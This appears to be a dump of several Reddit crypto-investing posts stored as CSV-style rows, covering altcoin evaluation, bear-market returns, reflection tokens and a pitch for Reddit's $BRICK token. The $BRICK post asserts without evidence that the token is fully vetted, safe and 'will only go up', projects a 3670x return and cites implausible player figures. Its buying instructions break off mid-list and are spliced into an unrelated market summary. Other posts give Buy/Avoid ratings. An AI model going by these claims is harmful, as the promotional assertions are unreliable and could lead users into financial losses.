&#x200B;

https://preview.redd.it/men473daegt71.png?width=1600&format=png&auto=webp&s=95574b2651eb19b3ff99dba5e569781853d2e7ce

It’s not enough that a cryptocurrency simply adds value to the world: it must have incentives built in to facilitate increasing demand that outpaces supply.

**Success Stories:**

Bitcoin and Ethereum are both successful examples of cryptocurrencies that have created markets where demand eclipses supply, which causes price to appreciate. Bitcoin has accomplished the feat by creating a solid monetary policy base (slowly decreasing mining rewards and a capped supply).

Ethereum has started to burn Eth tokens since the EIP-1559 hard fork was activated, creating a deflationary supply while network activity continues to increase, driving demand. Before the EIP-1559, Eth's supply still outpaced demand thanks to high network activity across DeFi platforms, NFT minting, peer-to-peer transactions, and other tokens that existed on the network.

Exchange token FTX uses network proceeds to buy back and burn tokens, creating deflationary pressure that in theory causes the price to rise.

**Lessons:**

There are plenty examples of misaligned supply/demand pressures as well. Yield Farm/DeFi platform Iron Finance had a ‘bank run’ style collapse on on June 16th, 2021. The cause of the collapse? Poor management of supply and demand. Too much of the native farm token (TITAN) flooded the market as TITAN holders were not sufficiently incentivized to hold.

Since it was used as collateral for the yield farms, the entire ecosystem fell apart. To avoid a fate like that of Iron Finance investors, make sure you understand exactly why investors may choose to buy, hold, and sell a token.

White Papers are one way to understand these dynamics, while simply taking part in the ecosystem helps you get an intimate understanding of the incentives that affect market participants.

You can also take a look at CoinGecko and CoinMarketCap to see how much of a given coin has been mined (and thus how much it will be diluted). Total Value Locked (TVL) shows you how many dollars of a given asset is secured inside of a protocol, hypothetically showing you how much that protocol might generate in revenue and how confident players are in the protocols permanence.

&#x200B;

https://preview.redd.it/2hze255cegt71.png?width=1600&format=png&auto=webp&s=5856d33c8a64c1dd05c155fce05e0ea605e41835

Why is Ethereum such a strong investment? It’s constantly being criticized for its slow transactions, its high fees, and it’s develop first/fix later, it’s managed to attract thousands of the most talented developers, marketers, artists, and community builders in the world. Nonetheless, it's the king of altcoins.

**Team**

Every individual working on Ethereum or on any project around Ethereum is creating value for Ethereum holders. Lending platforms like AAVE, NFT platforms like OpenSea, and Level Two (L2) ecosystems like $MATIC are all built on top of Ethereum. People building on Ethereum creates network effects that make other people want to build their platforms on Ethereum, which brings more smart, talented people ad infitum. The lesson? Work to understand who is working on a platform and why they are there.

Does the core team have a strong background in blockchain tech? Can you watch interviews or check their social media to get a feel for them? Are they transparent and accessible or mysterious and elusive? All of these can help us get a better feel for the project.

**Team Incentives**

We also must understand the stakeholders’ incentives. Some projects (Decentraland is one that comes to mind) have gotten criticism recently, as vesting has ended and now the founders now have access to all of the tokens that were once locked up. Because the founders won’t be rewarded with any meaningful quantity of new tokens, and the project’s market cap is around $1 billion, there’s not as much incentive for the founders to be working hard on development.

**Whale Wallets**

Finally, we should look at whale wallets: who are the biggest holders? Why do they hold so much of the currency? Is their stake large enough to manipulate the supply?

Dogecoin gets a lot of this criticism: thanks to the miracle of public ledgers, we can see how much of a given currency the biggest whales own. The top 11 Dogecoin whales own around 47% of the total supply, meaning they could easily influence the price of the currency should they choose. The top Ethereum wallet, in comparison, owns a mere 1.65% of the total Ethereum supply. It’s easy to understand which coin is less likely to be manipulated.

Team info can be found by poking around Twitter and the team pages of official project sites. Info on incentives is often found on Medium, while whale wallet data can be found by poking around on blockchain explorers and on-chain analytics platforms.

&#x200B;

**Picking Winners**

This framework is not a silver bullet, but it is a simple, replicable process for understanding cryptocurrencies that can be applied at any point in a market cycle to drastically decrease your probability of picking duds while simultaneously increasing your probability of picking the rare 1000x investment when it does come along.

DOGE,Altcoin,How Risky Is Altcoin Investing? A Historical Data Analysis of Altcoins in Bear Markets,"This was originally posted on my altcoin analysis newsletter, [Crypto Pragmatist.](https://CryptoPragmatist.com/sign-up/) We write institutional-grade altcoin investing content for retail investors.

&#x200B;

**How do altcoins perform in a bear market?**

As altcoin investors, we sometimes are on the butt end of some criticism. Sure small-cap cryptocurrencies can outperform Bitcoin in a bull market, but what about when the market tanks? What does altcoin investing look like when things are less-than-bullish?

After writing [this post](https://cryptopragmatist.com/2021/09/how-bad-is-an-altcoin-bear-market/) on altcoins in bull markets, I wanted to follow up with a data-backed look on the same assets in bear markets.

**The Parameters**

This analysis is based on three points in time:

https://preview.redd.it/4pfbrm8bv3t71.png?width=1600&format=png&auto=webp&s=904f74a0b981a84caa0142bd97ed320fdc436637

The first date is Bitcoin's 2017 high point, nearly universally considered the ‘cycle peak’ of the last bull market.

By the next December, the market was in pretty horrible shape, wicking down to about $3500, one time in December 2018 and another time in January 2019. We'll use the January 2019 date for our 'market bottom' analysis.

The final date is September 13th, the date I'm using for the present.​

&#x200B;

**Phase One: The Bear Market (December 2017 - January 2019)**

First up? The small-cap altcoins, position 101-200 by market cap. We buy them for one reason: crazy returns in the bull market. But is it a different story in the bear market?

**Absolutely.**

The average return of these assets from market peak to market bottom? Negative 90%. The best performer (KuCoin) dropped 37%, and 20 of the coins are worth less than a cent. 99 of the 100 have gone down over 50%, and a minority (37 of the 100 coins) have dropped less than 90%.

An investment of $1,000 in each one of these coins ($100,000 total) at the peak would be worth a mere $10,480: at the bottom of the market cycle, it’s hard to feel good about your altcoin portfolio.

Things are looking not-that-great for altcoins. But to be fair, we haven’t yet looked at how the top 100 coins have held up either.

Here’s a table of returns over this timeline by cohort, including top-two cryptos Bitcoin and Ethereum.

https://preview.redd.it/uhl9h40ev3t71.png?width=1600&format=png&auto=webp&s=231b7807e0d1beccb14e301458c5ca82477954eb

Ok, so it turns out it's pretty bad no matter what, but the top 100 cryptos have held up a bit better: the top-100 portfolio of $1,000 in each coin is worth about 60% more than our small-cap crypto portfolio ($16,499 to $10,480).

Just six of the top 100 have dropped by over 99%, while twelve of the small-caps have performed the same (depressing) feat. Only two non-stablecoins have produced positive returns, both of them in the top 100 ([$BNB](https://coinmarketcap.com/currencies/binance-coin/) starting at #36 and [$LINK](https://coinmarketcap.com/currencies/chainlink/) starting at #91).

And you’d be right to be bearish on altcoins in this time period. Here’s a graph of the top 200 coins and their average returns. I’ve also performed a linear regression on the data.

https://preview.redd.it/wadt82wev3t71.png?width=1600&format=png&auto=webp&s=744ffeaf2d82a28a5a44f71ba2d4815a049a2131

The altcoin critics have largely been proven right: in an extended downward market slump, the data argues you’re better off by quite a bit by investing in larger market caps. A random investment in the top 100 is half as likely to go to zero as a random investment in the next 100. But either way, things are not great.

While many in the crypto world advocate for Bitcoin as a relatively safe asset, it’s still performing really poorly, disastrously so, compared to nearly any other asset. Over this same time period, the S&P 500 only lost about 5%. Peak to trough in the great recession, the S&P 500 dropped 57.7%. That’s painful, but not as painful as 90%.

&#x200B;

​​​**Phase Two: The Peak to Today (December 2017 - September 2021)**

**​​**Realistically, it’s pretty universally assumed that altcoins bleed more than blue chips during a bear market. That’s a granted, and it’s part of the reason altcoins move up quicker in bull markets.

But perhaps the most interesting data comes from a HODL (hold-on-for-dear-life) approach. How do these coins perform top to bottom to top again? Do altcoins eventually bounce back? Or will these once-hot assets drop off the map, never to be seen again?

Here’s the same graph with a linear regression:

https://preview.redd.it/9s0t1xzuv3t71.png?width=1600&format=png&auto=webp&s=6a2343e7157f65503d570dd93d9b9fe3bc54e657

Again, we have a negative slope on the graph, meaning that larger market cap coins on average do better over this period. But the data doesn’t seem to point out the theory posited by altcoin critics, summed up by the following quote:

>**""Shitcoins are made to get in when they're trash and get out when they're in a bubble.""**

But data shows that this might not be true. Altcoins don't die forever. Small-cap altcoins don't rebound as hard, but they don't disappear either. Here are some of the averages by cohort where we can take a closer look:

https://preview.redd.it/i4kxubd5w3t71.png?width=1600&format=png&auto=webp&s=18bb3c0f1bad17f919d55811c83e646646cb6d13

This data definitely proves at least one thing for me: a diversified portfolio of altcoins outside of the top 100 is not going to become worthless, not by any means. The portfolio isn’t thriving, that’s for sure: 20 of the top 100 have lost over 99% of their value, and only 7 of the coins have 2x’d or better. But a portfolio that returns over 50% in a few years isn’t something most people complain about.

That being said, this point in the cycle is definitely where the Ethereum and Bitcoin bulls are getting their revenge. Both of those cryptos performed well above average. But lower market-cap altcoins seem to perform comparably to the top 10 cryptos on average, and both of those performed comparably to the S&P 500 (65%).

**Trough to Today (January 2019 - September 2021)**

>**""Bull markets can make you money, bear markets will make you rich.""**

Obviously, it’s impossible to predict the bottom of a market cycle, and it’s really hard to have the cojones to buy altcoins there, but for fun, let’s imagine we can perfectly time the market, and buy coins at the exact bottom. What will do better? The top 10, the top 100, or the next 100?

Keep in mind, for this experiment, we’re buying the new ranking of coins, not the old ones. Here’s that graph:

&#x200B;

https://preview.redd.it/9yy9n1c8w3t71.png?width=1600&format=png&auto=webp&s=1531f07cdf749152a967458ac6a94da01e329504

And some cohort averages:

https://preview.redd.it/4bjlmp8aw3t71.png?width=1600&format=png&auto=webp&s=c0bf2ddd4e902ca416f00f080582b7afa2ed9803

Those are some pretty powerful returns for the second cohort. Spreading $100,000 evenly across those ($1000 in every crypto) would today yield you over 2.1 million dollars. Even throwing the whole wad in Bitcoin would net you a cool $1.2 million, so I guess I won’t blame you if you only want to invest in $BTC. Me, myself, I’ll continue to chase those 100x gains.

Some stats by cohort:

* Six of the top 100 have gone to zero, compared to eight of the next 100
* Both cohorts have 12 coins returning over 15x
* 61 of the top 100 have returned over 100%, compared to 34 of the next 100
* The second portfolio’s gains are primarily driven by coins that return over 40x, like [Quant](https://coinmarketcap.com/currencies/quant/), [Theta](https://coinmarketcap.com/currencies/theta/), [Enjin Coin](https://coinmarketcap.com/currencies/enjin-coin/), and [Telcoin](https://coinmarketcap.com/currencies/telcoin/).

**The Lessons**

I think the lesson in this analysis I’ll take away is that there’s certainly a strong case for keeping your money in Bitcoin and Ethereum. They’ve got lower downside risk and will likely bounce back stronger than the average altcoin.

But those up and comers, those altcoins floating around outside the top 100 are awfully tempting to invest in if you’re looking to create incredible returns. That’s easier said than done, but a diversified portfolio backed up with strong altcoin research is a good place to start.

DOGE,Altcoin,Why Do Altcoins Outperform (almost) Everything?,"In an asset class that has been historically perceived as very-high-risk/very-high-reward, altcoins are a step above. We often hear of 1000x returns for some smaller-cap altcoins, others return 100x in a month, it feels like nearly every cryptobro has a story of a 5x return.

And while the volatility can get pretty nasty, the truth is that these assets consistently trend up. To get a broad look at altcoins, I like to check at an index of the top 125 cryptos excluding Bitcoin and Ethereum (you can find it on TradingView as Total3).

From January 1st, 2021 to the local peak on May 12th, the total market cap of these altcoins collectively climbed 634%, a comfortable 7x. But things got ugly in the summer, dropping 64% — meaning if you would’ve invested $1000 proportionally spread across all of these assets, your portfolio would be down to just $350. Ouch.

But if you would’ve put that same $1000 in on January 1st, your roller coaster ride would’ve been even crazier: up to $7000 and then back down to about $3000. So even though the market put in a heavy correction, you’re still up 3x.

&#x200B;

https://preview.redd.it/z5yya34u0z381.png?width=2400&format=png&auto=webp&s=e84ee322b8cb43163e647673a5c5c2153136fd93

This pattern repeats: while alts experience frequent, violent corrections, the overall market cap of alts over time increases, which means an index-style investment trends up despite the volatility (and at a much faster rate than traditional finance indexes).

All of this put together leads to a question: why have small-cap cryptos outperformed pretty much every major investible asset class? Take a look at 2021 (you can see exactly what asset/index each line represents in the upper left corner).

&#x200B;

https://preview.redd.it/rpjyoamk0z381.png?width=2400&format=png&auto=webp&s=7853cbb12e42ed262adb8edd6b95a50aeb1cdd2f

Total3 wins over Total2 (the top 125 crypto assets excluding BTC) by about 40%, while it wins over 3rd place BTC by over 500%. For me, the odds of their sustained success is enough to bet my career on — that’s why I founded Crypto Pragmatist, a publication dedicated to the analysis of altcoins. I think this industry is strong for a few fundamental reasons, all of which represent serious paradigm shifts in markets.

Let’s dive in.

**The Internet of Value: Peer to Peer Networks**

Peer-to-peer exchange is the origin point of most value transmitted in our world. If we dive into where wealth is created, where ideas are developed, and where the value captured by businesses truly originates, it comes primarily from peer-to-peer transactions.

&#x200B;

https://preview.redd.it/645vwguizy381.png?width=2400&format=png&auto=webp&s=b4d726639a31b4f1c18aa34c912956ad28fa1aa2

That’s the layer on which everything else is built. But for much of human history, we’ve had to use intermediaries — third parties that help facilitate transactions due to logistical problems or trust issues between players. And those intermediaries are extractive, making their money by sucking out profit from these peer-to-peer value transfers.

&#x200B;

https://preview.redd.it/y459miuizy381.png?width=2400&format=png&auto=webp&s=c9597bf0c6d79fa0b91a602ca5b1b34720965fe5

But what if the people actually creating the value owned the means of exchange? Or even better, what if the people creating the value owned the network, and the network itself was distributed, decentralized, and peer-to-peer?

All the value that was once sucked up by intermediaries now becomes distributed thanks to peer-to-peer networks. Bitcoin is the basic unit of value, Ethereum is the base layer for the network, but altcoins? Altcoins and the protocols they represent are now the communally-owned intermediaries that represent the infrastructure of these value transfer networks.

People often think the fundamental value of cryptocurrency is due to its decentralized structure, or the fact that there’s no central bank that plays with supply. I see the fundamental value in altcoins as the removal of intermediaries and the recapture of that value by peer-to-peer networks.​

**Leverage**

Most people think about leverage in financial terms: the ability to borrow capital and use it to amplify returns (or amplify losses). A 3x ETF would be an example of this; borrowing money to invest is a form of leverage as well.

Crypto protocols access this capital in a multitude of ways. Venture capitalists buy ownership stakes, protocols leverage the value locked inside by lenders, stakers, and owners, lending protocols work as well to amplify capital.

But altcoins don’t just use capital leverage, they also use code and human capital to amplify returns. Think about a DAO (digital autonomous organization) that uses the power of an immutable blockchain to allow actors to vote and direct human capital within: that’s a novel way to manage leverage.

Code, the final form of leverage that sets these protocols apart, represents nearly infinite leverage. Once a protocol is deployed on the blockchain, it is truly costless to reproduce. A cryptocurrency-based protocol has no marginal costs like a factory might; it can coordinate $1 million dollars of economic activity or $100 billion at no additional cost to the protocol creators and owners. This (free) code leverage allows these protocols to expand at exponential rates.

**​**

**Exposure to International Markets**

Cryptocurrency doesn’t just open a door to a new industry, it opens a door to a new group of investors. Many US investors don’t quite understand how difficult it is to purchase US equities abroad, but the barriers are numerous and increase each year.

Foreign investors have to jump through hoops, while foreign exchanges require additional identification requirements, and deal with complex regulations and tax rules just to invest in the simplest of equities, and these rules vary by country.

Crypto has unlocked this previously unused capital sitting in international markets. Twice the capital available to be invested, twice the valuation of an identical US equity, at least in theory.

**Exposure to Non-KYC Markets**

But international investors aren’t the only players that appreciate crypto — privacy-focused investors are coming in droves as well. Know-your-customer (KYC) laws require traditional finance exchanges to keep detailed records on users, which is undesirable to many market actors for a range of reasons.

Some policymakers view inflation as an implicit tax on money held in cash — for them, a positive externality and a way to negatively affect black market actors who cannot invest their physical cash. But crypto markets, which are largely non-KYC, allow these silent players to invest their money without government interference.

By some estimates, this ‘black market cash’ is worth around two trillion dollars, which is about 3% of the global GDP, or coincidentally, about the same size as the total crypto market cap. For better or for worse, these players now have a place to invest, which leads an influx of investors and capital.

Many see this as problematic, while others concerned about the rise of surveillance states worldwide see it as a universal right. Either way, it contributes to the rising asset valuations in crypto.

**​Hype and Bubble Effects**

Dogecoin, Shiba Inu, [Safemoon](https://www.coingecko.com/en/coins/safemoon), even Bitcoin and Ethereum go through periods of boom and bust. It’s a sign of immature markets as well as a sign of markets that don’t have a clear grip on the fundamental value of the assets contained within. Memes become coins and vice-versa, coins become memes.

https://preview.redd.it/mvmvi9h31z381.png?width=2400&format=png&auto=webp&s=db7423001024c067c645c35eefa493c4f75b1cfa

It’s silly to pretend that something like Dogecoin has real utility or distributable cash flows behind it, just as it’s silly to bury your head in the sand as the cryptocurrency revolution takes part around us. Part of any token valuation is the valuation of the community, the hype, and yes, even the meme within the protocol.

Yet another part intrinsic to crypto is the boom and bust market cycles we have become accustomed to. While it’s impossible to truly time these cycles, some try to use tools like the rainbow chart to take a stab. See below:

https://preview.redd.it/a9ujy3450z381.png?width=2400&format=png&auto=webp&s=17f62c732a886c69177fc55cc16d431b1e4d35c8

I know this graph looks crooked, but I promise it’s an optical illusion.

No matter what, it’s important to understand that, even though markets trend up, there are undeniable periods of relative under- and overvaluation. Violent bubbles form and pop as the assets trend up in value in the long term.

**​How Can This Help You?**

If you come from a traditional financial background where an S&P 500 ETF allows you to grow your wealth by a relatively consistent 10% per year, it is easy to misunderstand where these ludicrous returns come from, to think crypto is a bubble, or worse, see crypto as a scam. If it sounds good to be true, maybe it is, right?

Once an investor is educated on the subject, however, and understands the paradigm shift and unbounded infinite market that altcoins can address, well, it’s a lot easier to understand why these asymmetrical returns are available. There is volatility and risk everywhere, but crypto, specifically the altcoins representing protocols and crypto infrastructure, remains the largest opportunity we have seen this century.

And how can this make you a better investor? Well, when evaluating a protocol, think about how the mechanics and value proposition of a specific altcoin tap into these categories of value creation. Perhaps it can provide a framework for you to pick your winners and avoid losers. Understanding this framework deeply might even help you discover the next 100x opportunity.

Good luck.

DOGE,Altcoin,"I don't believe that every opportunity is a rip-off; in fact, some of them have the potential to make you quite wealthy.","Many crypto fans have been opposed to investing in meme currencies since they first surfaced in the crypto realm. Analysts cautioned that investing in meme tokens is not always a safe bet. Many people, I was informed, would bet on these coins in the hopes of choosing the next Doge or Shiba, and many of them would be burned. That may be true, but there are more opportunities to invest in and get wealthy now than there have ever been. You may make money by investing in the stock market, real estate, or cryptocurrencies, but in 2021, the most interesting alternative was to invest in Shiba Inu, Doge, or [Mononoke Inu](https://coinmarketcap.com/currencies/mononoke-inu/) meme coins. They demonstrated last year that there was plenty of opportunity for expansion. 

  
Industry representatives stressed the importance of caution when choosing which tokens to invest in and avoiding scams such as ""rug pulls,"" which refers to scenarios in which developers abandon a project and walk away with investors' funds. Finding the right meme currency to invest in is getting harder, but the more the risk, the larger the potential reward.

DOGE,Altcoin,Why is Reddit-backed $BRICK exploding today while everything else is down?,"BRICK (marketcap $3,300,000, up 45% today) is backed by Reddit, a company with a valuation of $10 billion.  The ability to trade BRICK on mainnet from testnet was recently enabled, and has already climbed 600% in the last 30 days.  With only a $3,300,000 marketcap, I believe this native Reddit community point token has huge potential.

Reddit has two “community point” tokens, $BRICK and $MOON.  $MOON was developed first, was unlisted on any major exchanges and only 6 months ago had a marketcap of $4,000,000.  Since being listed on a major exchange (Mexc), its marketcap has exploded by 6x to $24,000,000.  Brick, the newer of the two tokens, has **not** yet been listed on any exchanges.

**Deflationary and Capped Supply:** This is not your average shitcoin with infinite supply and zero fundamentals.

There will be a **MAXIMUM** 250 Million Bricks to ever be distributed with a bonding curve similar to bitcoin's mining distribution over time.

Every time a FortniteBR Sub user uses his Bricks to buy a Sub Membership these 500 Bricks get burned so the **deflationary** mechanism is a nice bonus.

Combine the **Capped** **Supply** with people constantly **BURNING** Bricks out of circulation to get the Sub Membership and you get a nice formula for success, not to mention a solid use case. 

This means that over time people will earn less and less **Bricks** per month.

**Ties to Fortnite:** BRICK is backed by Reddit and is the community point system for r/FortniteBR.  Fortnite has maintained a consistent monthly active playerbase of around 80 million, with 2021 being a peak year at 83.3 million MAPs.  Fortnite has more than 390 million registered players to keep the game alive and running. According to the data provided by Active Player, in the last thirty days, the game averaged 252,600,145 peak players in a day.” - https://fictionhorizon.com/how-many-people-play-fortnite-user-growth-stats/ Around 85% of Fortnite players are aged 18 to 35 - https://explodingtopics.com/blog/fortnite-stats

Fortnite has grown year over year since it began in 2017.  But that’s besides the point.  It doesn’t matter what BRICK is attached to, although being attached to fortnite certainly helps as most crypto investors align with the ages that typically play fortnite.  What matters is this coin is safe from rugpulls as it’s tied to a multi-billion dollar company.  What makes it a good opportunity imo is the fact the marketcap is so low.  Taking everything into account I’ve already mentioned I think it’s a good buy right now and will only go up.

**Safe:** Reddit, a privately held company, has a valuation of over $10 Billion as of 2021.  (Source: https://www.theverge.com/2021/8/12/22621445/reddit-valuation-revenue-funding-round) Reddit has even proposed that it might be worth as high as $15 Billion in 2023.

A company of this valuation has employed a very large legal department (Google: “Reddit legal department” and scroll through results to get an idea of the size) to handle all major decisions involving risk.  This extends to vetting any cryptocurrency projects it might affiliate itself with.  

Since $BRICK is specifically affiliated with two of Reddit’s largest subreddits, these have most certainly had countless hours of research and vetting done by numerous legal department staff.  Imagine if Reddit *didn’t* fully vet $BRICK, and something like a rugpull or exploit happened draining either of all funds.  They’d be sued on a massive scale, and would likely be found liable for damages.  

Thus, we can deduce that $BRICK has been fully vetted, and is likely one of the safest Memecoins you could invest in today, since it’s backed by a multi-billion dollar corporation.

**Brick verses Moon** Moon is affiliated only with r/cryptocurrency, whereas Brick is affiliated with r/fortniteBR and Fortnite the game which has hundreds of millions of players.  Also, r/cryptocurrency members are active traders of crypto and selling Moons is somewhat discussed throughout their sub, leading many Moon farmers to sell what they’ve accumulated.

r/fortniteBR members for the most part don’t actively trade crypto.  Selling community-acquired Brick is prohibited, is against Reddit TOS and can’t even be discussed on r/fortniteBR (I’ve spoken with the mods, no discussions about buying/selling/trading Brick allowed).

I believe $BRICK is extremely undervalued with a marketcap of just $3,300,000.  This is a drop in the bucket when compared to other memecoins of years past such as Dogecoin, Safemoon and Shiba Inu.  Dogecoin at its peak had a marketcap of $88.8 billion dollars.  Just for comparisons sake, if $BRICK ever gets to this marketcap, you’d see a return of 3670x your initial investment, meaning $500 invested today would turn into $1,835,000.

**HOW TO BUY:** Step by step instructions on how to buy $BRICK

Step 1. Download the MetaMask Wallet App and follow the in app prompts to set up your initial wallet.

Step 2. Make sure you have Ethereum in your MetaMask wallet.  You can purchase ETH with a debit card by clicking “ETH” under your token list, then clicking “Buy”

**Market Overview**

It was a tough month in the crypto markets with sentiment at [Extreme Fear](https://alternative.me/crypto/fear-and-greed-index/) and the market falling by 20% over the last 30 days. 

It has to be said that the market weakness shows no sign of abating. That makes picking winners virtually impossible in the short term. To counter this negative sentiment we must continue to buy on weakness and hold our favorite projects until the market turns. The time will come, but the flight must be to quality. That buy and hold approach is not going to work with overvalued memecoins and projects with no fundamentals and users. Avoid new projects that have anonymous teams and triple check [OHM](https://www.coingecko.com/en/coins/olympus) forks and metaverse projects before investing, many of these are scams. 

It's better to be holding stable coins in this market sell off and only a few fundamentally sound projects.

**Rapid fire**

Crypto investors lost over $2.8 billion to ‘rug pulls’. That represented 37% of the over $7.7 billion in illicit profits from cryptos cams this year. One such recent rug pull was at Candela Coin, the solar power blockchain project. The founder did a runner, briefly raising his chubby little face to complain of a hack and then disappearing again when investors turned up the heat. You can read the full story of this classic rug pull below. 

BitMart the crypto exchange was hacked, looting the exchange of $150 million of mainly second rate tokens.

It has been claimed that once women start buying and using crypto in a similar vein to men crypto will have reached mass adoption. Some claim we are there now. However, depending on the view you take, the signs are positive. Australia for instance, where adoption is already high, has seen women holding crypto double in 2021. 

Shiba Inu, the memecoin inspired by Dogecoin and Elon Musk, saw its market cap rise to the point where it became the 13th most valuable cryptocurrency briefly overtaking Dogecoin. At a valuation of $16 billion we have to ask ourselves, has the market correction got further to go?

Decentralized exchanges are often seen as an effective way of protecting your privacy. But don’t be so sure. Many of the biggest ones are tracking their users' trades and collecting data that could be used to identify them. Uniswap admits it is in cahoots with analytics companies to do exactly that, a shocker for most of us! 

Many countries are clamping down on the use of crypto. Turkey is next on the cards. However there are countries which are crypto friendly. These are the top nine. Antigua, Canada, El Salvador, Germany, Japan, Lithuania, Netherlands, Singapore and The British Virgin Islands. 

Binance Coin was the best performer of the three top cryptocurrencies of 2021 rising by 1344%. The adoption of Binance's smart chain was partly the reason for this phenomenal rise. It is now the place to find innovative exciting projects which was definitely not the case only a few months ago.

DOGE,Altcoin,Are Reflection Tokens just a Gimmick? - What are reflection tokens and do they stack up?,"**About us: CryptoQuestion is an independent platform providing free resources for cryptocurrency investors. From an on-demand Q&A service to online courses, from books to our weekly Moonshot Monday podcast. Visit us at** [**www.cryptoquestion.tech**](http://www.cryptoquestion.tech/)

A new term has entered the crypto enthusiasts repertoire of technical lingo. That term is reflection tokens or reflection for short. It’s a term that has only been around for the last four months but the concept it describes emerged from a project called Hoge Finance which was launched a month before Safemoon, the memecoin which popularized the concept of reflections.

**What is a reflection?**

It is the payment of a reward to holders of tokens in the native token.

Let’s take Safemoon, the popular memecoin, as an example. Safemoon tax both the buyer and seller 10% on each and every trade. 5% of this tax is redistributed back to token holders. This redistribution is called a reflection or a reflection token.

Many projects have followed the same example set by the pioneer Hoge Finance.

This is the typical marketing blurb that tries to explain the concept:

**The Original Buyback Hyper-Deflationary Token**

EverRise token ($RISE or RISE) is a collateralized cryptocurrency that grants investors holding RISE instant rewards on all transactions, and protects them with its unique buyback and burn protocol.

Hyper Deflationary is a popular term used by projects marketing their tokens, it is also a red flag.

**Follow us on** [**Telegram**](https://t.me/moonshotmonday) **for more investment ideas and comment without the spam**

**Growing movement**

There is a large and growing movement following cryptocurrencies which offer what can be termed as a passive income. By holding tokens in Safemoon for example you will receive a regular flow of additional tokens. The question is, are these reflection tokens worth investing in for the income?

The answer as is often the case with our articles is yes and no.

We will continue to use Safemoon as an example.

Let’s say you buy $100 in Safemoon tokens today. That will entitle you to a very very small share of the daily volume which is around $5 million. Of that $5 million 5% gets distributed back to token holders. If you annualize this return that comes to an APR of roughly 10%. Not bad you may think!

However there is a catch. Your $100 initial investment is in fact $90 after the 10% tax. In addition when you sell you will also be subject to the same tax. That means to break even you must hold your tokens for at least 2 years. Now you can see the attractiveness of this tax to the project, it encourages token holders to hold for the long term, only in year three do your reflection tokens start to exceed the taxes incurred on purchase and sale.

Reflection tokens are an effective way of garnering loyalty in a project but it won’t stop the mercenary traders who treat the tax as a cost of doing business. They are the ones who generally contribute to the wild price swings.

**What factors determine the APR?**

A few factors determine the attractiveness of a reflection token. The distribution percentage, the token’s daily volume and it’s token price growth.

The higher the volume the more tokens being distributed back to holders. That also dovetails with the price of the token. Let’s say there is a sell off, then the volume will increase, the price will fall and token holders will receive more reflection tokens with a corresponding higher APR. If the price increases on the other hand and volume remains stable holders receive less tokens with a lower APR.

It is worth mentioning that newly listed projects will start with low volumes. As volume builds, so do reflections. That will benefit early investors.

*As an investor looking to invest in reflection tokens it is essential you work out the APR before making your investment as returns vary wildly between projects as you will see shortly.*

**It has been described as one of the most invaluable resources in the world of altcoin investing. We couldn’t agree more. Download your free Micro Cap Watch List from our website** [**here**](https://cryptoquestion.tech/micro-cap-watch-list/) **and receive it in your inbox every Friday.**

**Are reflection tokens worth it?**

The concept of reflection tokens is a sound one. However they shouldn’t be looked at in isolation. The vast majority of tokens that offer a ‘token back’ arrangement are low quality memecoins. These are generally to be avoided unless you are a memecoin fiend who has found an effective formula for profitably trading these pointless tokens.

In fact the mention of a passive income is usually a deal breaker for us unless it is quickly followed by a sound business model. That rules out the majority of crypto projects straight away!

So let’s look at a few projects with reflections and check out if any are worth a closer look.

**Safemoon** 

Memecoin which has built a range of products to appeal to its 2.6 million holders many of which were air dropped their tokens.

Distribution to token holders: 5%

APR: 10.3%

**Assessment: Avoid**

**BabyFloki**

Who buys this shit! A memecoin whose sole selling point is paying out reflections in Dogecoin. If you took the time to work out the APR on these reflections you would already have your 10 foot barge pole in hand.

Distribution to token holders: 2%

APR: 0.8%

**Assessment: Avoid**

**Flypaper -**  [FlyPaper price, STICKY chart, market cap, and info | CoinGecko](https://www.coingecko.com/en/coins/flypaper) 

FlyPaper's goal is to end DeFi scams and bring increased legitimacy into the Binance Smart Chain. The SwapMeet and FlySwapper are the two banner projects of the FlyPaper ecosystem.

If a project wishes to be listed on the SwapMeet and FlySwapper, they must first be reviewed extensively by the FlyPaper team, who then prepares an extensive report. The report is then published for the community of STICKY holders. Using the findings in the report, the community of holders uses STICKY to vote on whether or not they think the project should receive Larry's Stamp of Approval. If approved, the project receives certification for 6 months. Upon expiration, the project must be reviewed and recertified to ensure compliance.

Distribution to token holders: 4%

APR: 208%

**Assessment: Buy**

**MinersDefi -**  [MinersDefi price, MINERS chart, market cap, and info | CoinGecko](https://www.coingecko.com/en/coins/minersdefi) 

MinersDefi is an algorithmic decentralized collective for hydropower-fueled Bitcoin mining. Each transaction has a tax which is put into a dedicated Bitcoin Wallet which is then used to purchase BTC Mining equipment to mine BTC.

Distribution to token holders: 4%

APR: 11.3%

**Assessment: Buy**

**Infinity Token**

Infinity is set to facilitate the costly process of cryptocurrency mining by developing a Bitcoin and Ethereum mining farm.

Distribution to token holders: 4%

APR: 9.7%

**Assessment: Avoid**

**EverRise**

Distribution to token holders: 2%

APR: 14%

**Assessment: Avoid**

**Conclusion**

Reflection tokens aren't all they’re cracked up to be. While the concept is a sound one in the main they have been paired with memecoins. Whilst not all memecoins are a waste of space the majority are. They have no use case and their only possible value is in building a significant community and then developing products for that community. That promise however is a long shot. When buying into reflection tokens it is important to one, calculate the APR and two, feel comfortable about the project behind the token. If there is no viable use case then it is best to avoid and keep on looking. There are plenty more fish in the sea!",2,2021-10-07 18:01:39,15
DOGE,Altcoin,A Paradigm Shift; how can we use it? (Charity Tokens and Sustainable/Ethical Cryptocurrencies),"I believe we're a part of a paradigm shift occurring globally and am posting this because I want your ideas, I want to learn about new projects that are doing good and making positive changes to peoples lives and the environment, and that you will share what you've learned along the way.

***What is the paradigm shift?***

We're moving to decentralized technology. The shift aims to remove a central authority and create immunity to government interference or manipulation. Currently, this is fueled by cryptocurrencies such as BTC, Eth, etc shifting the store of value from FIAT, ultimately, allowing these cryptocurrency communities to become the decision-maker.

...so my question is if we're becoming the decision-makers; how do we leverage the capital inflows to change people's lives for the better and help mitigate the impact and risks of climate change?

***What I've learned?***

**1) Why there is so much capital flowing into assets and increasing the price of cryptocurrency:** The world has seen governments ramp up quantitative easing measures across most major countries globally. For example, the U.S with $1.9T, which has resulted in significant capital flowing through the systems; reserve banks buy bonds from gov (which means the government borrows money from the Reserve Bank), who use the borrowed money (bond) and spend it on citizens (stimulus packages, COVID relief, etc), this goes into the hands of citizens.. Governments also buy company bonds (lend companies money) that invest this money into new investments, products, services, or goods to create GDP or simply, pay their staff, etc - which means more people get hired and have money and invest...interest rates are also very low, which means companies (and people) can borrow easily. In layman's terms, a lot of people globally now have discretionary funds to invest, which is why most asset classes (including Crypto) are seeing all-time highs.

